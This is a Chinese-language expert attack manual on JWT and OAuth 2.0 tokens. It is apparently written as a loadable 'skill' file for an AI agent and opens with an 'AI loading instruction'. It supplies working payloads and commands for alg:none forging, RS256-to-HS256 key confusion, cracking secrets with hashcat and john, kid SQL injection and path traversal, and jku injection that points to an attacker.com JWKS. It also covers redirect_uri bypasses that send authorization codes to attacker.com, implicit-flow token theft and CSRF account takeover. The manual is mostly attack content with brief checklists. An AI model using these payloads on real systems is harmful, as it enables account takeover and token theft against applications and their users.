# 技能：JWT和OAuth 2.0令牌攻击——专家攻击手册

> **AI加载指令**：专家级认证令牌攻击。涵盖JWT加密攻击（alg:none、RS256→HS256、密钥破解、kid/jku注入）、OAuth流程攻击（CSRF、开放重定向、令牌窃取、隐式流程滥用）、PKCE绕过以及通过Referer/日志泄露的令牌。这对于现代Web应用程序至关重要。

## 0. 相关路由

使用此文件进行以令牌为中心的攻击和流程滥用。同时加载：

- [oauth oidc配置错误](../oauth-oidc-misconfiguration/SKILL.md)用于重定向URI、state、nonce、PKCE和账户绑定验证
- [cors跨源配置错误](../cors-cross-origin-misconfiguration/SKILL.md)当浏览器可读的API或令牌可能跨源泄露时
- [saml sso断言攻击](../saml-sso-assertion-attacks/SKILL.md)当目标在OAuth/OIDC外部使用企业级SSO时

---

## 1. JWT结构

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
└─────────────────────┘ └────────────────────────────┘ └──────────────────────────────────────────┘
         头部                     有效载荷                           签名
```

**终端解码**：
```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# → {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VySWQiOjEyMzQsInJvbGUiOiJ1c2VyIn0" | base64 -d
# → {"userId":1234,"role":"user"}
```

**常见声明目标**（修改以提升权限）：
```json
{
  "role": "admin",
  "isAdmin": true,
  "userId": OTHER_USER_ID,
  "email": "victim@target.com",
  "sub": "admin",
  "permissions": ["admin", "write", "delete"],
  "tier": "premium"
}
```

---

## 2. 攻击1——算法无（alg:none）

服务器在算法为"none"/"None"/"NONE"时不验证签名：

```bash
# Burp JWT Editor / python-jwt攻击：
# 第1步：解码头部
echo '{"alg":"HS256","typ":"JWT"}' | base64 → old_header

# 第2步：创建新头部
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-'

# 第3步：修改有效载荷（例如，role→admin）：
echo -n '{"userId":1234,"role":"admin"}' | base64 | tr -d '=' | tr '/+' '_-'

# 第4步：构造无签名的令牌：
HEADER.PAYLOAD.
# OR:
HEADER.PAYLOAD
```

**工具（jwt_tool）**：
```bash
python3 jwt_tool.py JWT_TOKEN -X a
# → 自动生成alg:none变体
```

---

## 3. 攻击2——RS256到HS256密钥混淆

**当服务器使用RS256**（非对称——RSA私钥签名，公钥验证）：
- 服务器的公钥通常可发现（JWKS端点、/certs、源代码）
- 攻击：告诉服务器"这是HS256" → 服务器使用公钥作为密钥验证HS256 HMAC

```bash
# 第1步：获取公钥（PEM格式）
# 从：/api/.well-known/jwks.json → 转换为PEM
# 从：/certs端点
# 从：OpenSSL从HTTPS证书中提取

# 第2步：使用jwt_tool以公钥作为密钥使用HS256签名：
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# 第3步：手动：
# 修改头部：{"alg":"HS256","typ":"JWT"}
# 使用PEM公钥字节使用HMAC-SHA256签名整个header.payload
```

---

## 4. 攻击3——JWT密钥暴力破解

基于HMAC的JWT（HS256/HS384/HS512）具有弱密钥：

```bash
# hashcat（快速）：
hashcat -a 0 -m 16500 "JWT_TOKEN_HERE" /usr/share/wordlists/rockyou.txt

# john：
echo "JWT_TOKEN_HERE" > jwt.txt
john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt

# jwt_tool：
python3 jwt_tool.py JWT_TOKEN -C -d /path/to/wordlist.txt
```

**常见的弱密钥手动测试**：
```
secret, password, 123456, qwerty, changeme, your-256-bit-secret,
APP_NAME, app_name, production, jwt_secret, SECRET_KEY
```

---

## 5. 攻击4——kid（密钥ID）注入

`kid`头部参数指定用于验证的密钥。无清理 = 注入：

### kid SQL注入
```json
{"alg":"HS256","kid":"' UNION SELECT 'attacker_controlled_key' FROM dual--"}
```
如果后端查询SQL：`SELECT key FROM keys WHERE kid = 'INPUT'`  
结果：HMAC密钥 = `'attacker_controlled_key'` → 使用此值签名任何有效载荷。

### kid路径遍历（文件读取）
```json
{"alg":"HS256","kid":"../../../../dev/null"}
```
服务器将`/dev/null`作为密钥读取 → 空字符串 → 使用HMAC签名令牌。

```json
{"alg":"HS256","kid":"../../../../etc/hostname"}
```
服务器将主机名作为密钥读取 → 使用主机名字符串签名令牌。

---

## 6. 攻击5——jku / x5u头部注入

`jku`指向JSON Web密钥集URL。如果未白名单：
```json
{"alg":"RS256","jku":"https://attacker.com/malicious-jwks.json","kid":"my-key"}
```

**设置**：
```bash
# 生成RSA密钥对：
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem

# 创建JWKS：
python3 -c "
import json, base64, struct
# ... (使用python-jwcrypto或jwt_tool导出JWKS)
"

# 在attacker.com/malicious-jwks.json托管恶意JWKS
# 使用攻击者的私钥签名JWT
# 服务器获取攻击者的JWKS → 使用攻击者的公钥验证 → 接受
```

**jwt_tool自动化**：
```bash
python3 jwt_tool.py JWT -X s -ju https://attacker.com/malicious-jwks.json
```

---

## 7. OAUTH 2.0——state参数缺失（CSRF）

state参数防止OAuth中的CSRF。如果缺失：

```
攻击：
1. 点击"使用Google登录" → OAuth开始 → 截取重定向URL：
   https://accounts.google.com/oauth2/auth?client_id=APP_ID&redirect_uri=https://target.com/callback&state=MISSING_OR_PREDICTABLE&code=...

2. 获取授权码（在交换前停止）
3. 构造URL：https://target.com/oauth/callback?code=ATTACKER_CODE
4. 受害者点击该URL → 其会话绑定到攻击者的OAuth身份
→ 账户接管
```

---

## 8. OAUTH——重定向URI绕过

授权码发送到`redirect_uri`。如果验证薄弱：

### redirect_uri中的开放重定向
```
原始：redirect_uri=https://target.com/callback
攻击：   redirect_uri=https://target.com/callback/../../../attacker.com
          redirect_uri=https://attacker.com.target.com/callback
          redirect_uri=https://target.com@attacker.com/callback
```

### 部分路径匹配
```
白名单：https://target.com/callback
攻击： https://target.com/callback%2f../admin (URL路径混淆)
        https://target.com/callbackXSS (前缀匹配仅)
```

### 本地主机/开发重定向
```
redirect_uri=http://localhost/steal
redirect_uri=urn:ietf:wg:oauth:2.0:oob  (移动应用)
```

---

## 9. OAUTH——隐式流程令牌窃取

隐式流程：令牌发送在URL片段`#access_token=...`中

**片段泄露场景**：
- 重定向到攻击者页面：片段可通过`document.referrer`访问或通过`<script>window.location.href</script>`在目标页面中访问
- 开放重定向：`redirect_uri=https://target.com/open-redirect?url=https://attacker.com` → 片段中的令牌到达攻击者页面

---

## 10. OAUTH——范围提升

在授权码中请求比授权更广泛的范围：
```
授权范围：read:profile
攻击：在令牌交换期间，添加scope=admin或scope=read:admin
→ 服务器是否授予请求的范围或已发行的令牌？
```

---

## 11. 令牌泄露向量

### Referer头部
令牌在URL中 → 页面加载外部资源 → Referer泄露令牌：
```
https://target.com/dashboard#access_token=TOKEN
→ HTML加载： <img src="https://analytics.third-party.com/track">
→ Referer: https://target.com/dashboard#access_token=TOKEN
→ analytics.third-party.com在Referer日志中看到令牌
```

### 服务器日志
在查询参数中发送的访问令牌存储在：
```
/var/log/nginx/access.log
/var/log/apache2/access.log
ELB/ALB日志（AWS）
CloudFront日志
CDN日志
```

---

## 12. JWT测试清单

```
□ 解码头部+有效载荷（对每个部分进行base64解码）
□ 识别算法：HS256/RS256/ES256/none
□ 修改有效载荷字段（role、userId、isAdmin）→ 也要更改签名
□ 测试alg:none → 完全移除签名
□ 如果RS256：查找公钥 → 尝试RS256→HS256混淆
□ 如果HS256：使用hashcat/rockyou进行暴力破解
□ 检查kid参数 → 尝试SQL注入+路径遍历
□ 检查jku/x5u头部 → 重定向到攻击者JWKS
□ 测试注销后令牌重复使用
□ 测试接受过期令牌（exp声明）
□ 检查GET参数中的令牌（日志泄露）与头部
```

---

## 13. OAUTH测试清单

```
□ 检查授权请求中是否存在state参数
□ 测试重定向URI操纵（开放重定向、前缀匹配、路径混淆）
□ 令牌可以交换多次吗？
□ 在令牌交换期间测试范围提升
□ 隐式流程：检查Referer/历史记录中的令牌
□ PKCE：code_challenge可以被绕过或code_verifier为空吗？
□ 检查授权码重复使用（代码必须是一次性的）
□ 测试账户链接滥用：将OAuth链接到具有相同电子邮件的现有账户
□ 检查OAuth提供者混淆：使用Apple ID链接到Google期望的地方
```
